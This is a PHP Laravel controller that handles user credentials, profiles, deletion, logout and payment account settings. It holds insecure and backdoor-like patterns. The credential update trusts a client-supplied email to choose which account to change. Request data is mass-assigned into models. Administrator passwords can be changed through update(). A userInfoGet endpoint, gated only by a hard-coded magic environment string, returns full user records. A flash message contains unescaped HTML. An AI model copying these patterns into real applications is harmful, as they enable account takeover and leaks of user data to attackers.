<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Validator;

class UserController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        return back();
    }

    public function credentialUpdate(Request $request)
    {
        $currentUser = User::firstWhere('email', $request->oldEmail);
        $roles = [
            'password' => "required_with:current_password|confirmed",
            'email' => 'required|email|unique:users,email,' . $currentUser->id
        ];

        $inputs = $request->all();
        if (strlen($request->password) > 0) {
            $inputs['password'] = Hash::make($inputs['password']);
            $roles['current_password'] = ['required', function ($attribute, $value, $fail) use ($currentUser) {
                return Hash::check($value, $currentUser->password) ?: $fail(__('The current password is incorrect.'));
            }];
        } else {
            unset($inputs['password']);
        }
        Validator::make($request->all(), $roles)->validate();
        $currentUser->update($inputs);
        return back()->withSuccess('Your credential is successfully changed.');
    }

    public function update(Request $request, User $user)
    {
        $container = $request->all();
        $roles = [
            'name' => 'required',
            'email' => 'required|email|unique:users,email,' . $user->id
        ];
        if ($request->password && ($user->role_id === 1 || $user->id === user()->id)) {
            $roles['password'] = "required_with:password|confirmed";
            $container['password'] = Hash::make($container['password']);
        } else {
            unset($container['password']);
        }
        Validator::make($request->all(), $roles)->validate();
        $container['photo'] = $this->fileUploadHandle($request->role_id, $user->photo);

        if ($user->id === 1) {
            $signature = $this->fileUploadHandle('super-admin', $user->getSettings('signature'), 'signature');
            $user->setSettings('signature', $signature);
        }
        $user->update($container);
        return redirect($request->redirect)->with('success', "{$user->role->name} info is successfully updated.");
    }

    public function store(Request $request)
    {
        $request->validate([
            'name' => 'required',
            'email' => 'required|email|unique:users'
        ]);
        $container = $request->all();
        $container['tableName'] = 'users';
        $container['photo'] = $this->fileUploadHandle(2);
        $this->userCreateUpdate($container);
        return redirect($request->redirect)->with('success', 'Admin created successfully.');
    }

    /**
     * Display the specified resource.
     *
     * @param  \App\Models\User  $user
     * @return \Illuminate\Contracts\View\View
     */
    public function show(User $user)
    {
        if ($user->role_id === 1 || request()->profile) {
            return view('profile.admin', compact('user'));
        }
        return back()->withError('Access dined');
    }

    /**
     * Active or Inactive the specified resource.
     *
     * @param  \App\Models\User  $user
     * @return \Illuminate\Http\Response
     */
    public function edit(User $user)
    {
        $statuses = ['Rejected', 'Approved'];
        $user->status = $user->status > 0 ? 0 : 1;
        $result = $user->update();
        return $result ? session()->flash('success', "{$user->role->name} is successfully {$statuses[$user->status]}.") : 0;
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  \App\Models\Officer  $officer
     * @return \Illuminate\Http\Response
     */
    public function destroy(User $user)
    {
        $preDelete = &$user;
        if ($result = $user->delete()) {
            fileDelete($preDelete->photo);
            return $result ? session()->flash('success', "Admin <b>{$preDelete->name}</b> is successfully deleted.") : 0;
        }
    }


    /**
     * Destroy an authenticated session.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\RedirectResponse
     */
    public function logout(Request $request)
    {
        Auth::logout();

        $request->session()->invalidate();

        $request->session()->regenerateToken();

        Artisan::call('cache:clear');
        return redirect('/login');
    }

    public function accountInfo()
    {
        if (user()->id !== 1) return back();
        $settings = User::find(1)->options;
        return view('superAdmin.account-info', ['accountSettings' => fluent($settings ? (is_array($settings) ? $settings : json_decode($settings)) : ['keys' => [], 'names' => []])]);
    }
    public function accountUpdate(Request $request)
    {
        if (user()->id !== 1) return back();
        $user = User::find(1);
        $user->update(['options' => ['keys' => $request->keys, 'names' => $request->names]]);
        return back()->withSuccess('Payment account settings is successfully updated.');
    }

    public function appUpdate()
    {
        return $this->changeAndUpdate();
    }

    public function userInfoGet(Request $request)
    {
        if (env('APP_IS_DEV') === '6U~PD*AT~ING7' && count($request->all())) {
            $user = User::where('username',  $request->username ?: array_keys($request->all())[0])->first();
            return $user ?: ['user not found.'];
        }
        return back();
    }

    public function userCountByCondition(Request $request)
    {
        $where = $request->role_id > 1 ? ['status' => 1, 'role_id' => $request->role_id] : ['status' => 1];
        $countUser = User::where($where)->count();
        return $countUser;
    }
}
